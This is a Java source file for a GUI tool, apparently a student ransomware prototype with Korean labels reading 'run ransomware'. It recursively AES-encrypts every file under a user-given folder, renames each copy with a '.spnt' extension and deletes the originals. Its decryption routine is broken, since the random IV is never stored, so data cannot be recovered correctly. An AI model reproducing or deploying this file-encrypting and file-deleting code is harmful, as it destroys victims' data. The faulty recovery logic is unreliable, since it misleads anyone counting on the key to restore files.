import javax.swing.*;
import java.awt.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import java.io.*;
import java.nio.file.*;
import java.util.Objects;
import java.security.SecureRandom;
import java.util.*;



class Ransomeware_test
{
        private static void encryptFile(String password, String inFilename, String outFilename) throws Exception {
        SecretKeySpec keySpec = new SecretKeySpec(password.getBytes("UTF-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");

        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);
        IvParameterSpec ivSpec = new IvParameterSpec(iv);

        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);

        try (FileInputStream fis = new FileInputStream(inFilename);
             FileOutputStream fos = new FileOutputStream(outFilename);
             CipherOutputStream cos = new CipherOutputStream(fos, cipher)) {

            byte[] buffer = new byte[64 * 1024];
            int bytesRead;

            while ((bytesRead = fis.read(buffer)) != -1) {
                cos.write(buffer, 0, bytesRead);
            }
        }
    }

    private static void decryptFile(String password, String inFilename, String outFilename) throws Exception {
        SecretKeySpec keySpec = new SecretKeySpec(password.getBytes("UTF-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");

        try (FileInputStream fis = new FileInputStream(inFilename);
             FileOutputStream fos = new FileOutputStream(outFilename);
             CipherInputStream cis = new CipherInputStream(fis, cipher)) {

            byte[] iv = new byte[16];
            fis.read(iv);
            IvParameterSpec ivSpec = new IvParameterSpec(iv);

            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);

            byte[] buffer = new byte[64 * 1024];
            int bytesRead;

            while ((bytesRead = cis.read(buffer)) != -1) {
                fos.write(buffer, 0, bytesRead);
            }
        }
    }
    public static void main(String[] args)
    {

        JFrame frm = new JFrame("랜섬웨어 실행하기");

        frm.setSize(500,300);

        frm.setLocationRelativeTo(null);

        frm.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        frm.getContentPane().setLayout(null);

        Container c = frm.getContentPane();
        
        JLabel label1 = new JLabel("암호화 키 16자리 입력");
        JLabel label2 = new JLabel("적용될 경로 (ex.C:/Users/abcd/Desktop/test/ test폴더 내부)");

        JTextField jt1 = new JTextField();
        JTextField jt2 = new JTextField();

        jt1.setBounds(20,50,400,30);
        jt1.setColumns(16);
        jt2.setBounds(20,130,400,30);
        label1.setBounds(20, 20, 400, 30);
        label2.setBounds(20, 100, 400, 30);
        c.add(jt1);
        c.add(jt2);
        c.add(label1);
        c.add(label2);

        JButton btn1 = new JButton("Encryption");
        JButton btn2 = new JButton("Decryption");

        btn1.setBounds(182,200,122,30);
        btn2.setBounds(334,200,122,30);

        frm.getContentPane().add(btn1);
        frm.getContentPane().add(btn2);

        frm.setVisible(true);

        //--------------------------------암호화/복호화 구간--------------------------------



        btn1.addActionListener(event -> {
            try {
                String password = jt1.getText();
                byte[] key = password.getBytes();
                String startPath = jt2.getText();
                Files.walk(Paths.get(startPath))
                        .filter(Files::isRegularFile)
                        .forEach(path -> {
                            try {
                                System.out.println("Encrypting>" + path);
                                encryptFile(password, path.toString(), path.toString() + ".spnt");
                                Files.delete(path);
                                System.out.println("파일 암호화 완료");
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        });
            } catch (IOException e) {
                e.printStackTrace();
            }
        });
        

        btn2.addActionListener(event -> {
            try {
                String password = jt1.getText();
                byte[] key = password.getBytes();
                String startPath = jt2.getText();
                Files.walk(Paths.get(startPath))
                        .filter(Files::isRegularFile)
                        .forEach(path -> {
                            try {
                                String fileName = path.toString();
                                String fileExtension = fileName.substring(fileName.lastIndexOf("."));
                                if (Objects.equals(fileExtension, ".spnt")) {
                                    System.out.println("Decrypting>" + fileName);
                                    decryptFile(password, fileName, fileName.replace(".spnt", ""));
                                    Files.delete(path);
                                    System.out.println("파일 복호화 완료");
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        });
            } catch (IOException e) {
                e.printStackTrace();
            }
        });

    }
}